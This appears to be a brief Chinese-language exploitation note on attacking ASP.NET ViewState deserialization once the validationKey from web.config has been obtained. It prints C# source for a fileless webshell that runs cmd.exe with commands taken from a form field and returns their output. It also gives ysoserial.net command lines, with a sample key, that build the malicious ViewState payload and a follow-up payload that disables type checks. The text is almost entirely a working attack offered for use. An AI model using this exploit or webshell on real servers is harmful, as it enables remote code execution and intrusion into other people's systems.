# asp.net中ViewState的利用



## 工具

 https://github.com/pwntester/ysoserial.net 



## 条件

获得validationKey,在web.config文件里有

## 利用



```cs
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }
}
```





```
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
              -c "ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll"
              --generator="CA0B0334"
              --validationalg="SHA1"
              --validationkey="B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5"
```



如果页面出现500错误,则发送一次如下viewstates

```
ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
              -c "ignore"
              --generator="CA0B0334"
              --validationalg="SHA1"
              --validationkey="B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5"
```





## 参考

 https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/ 

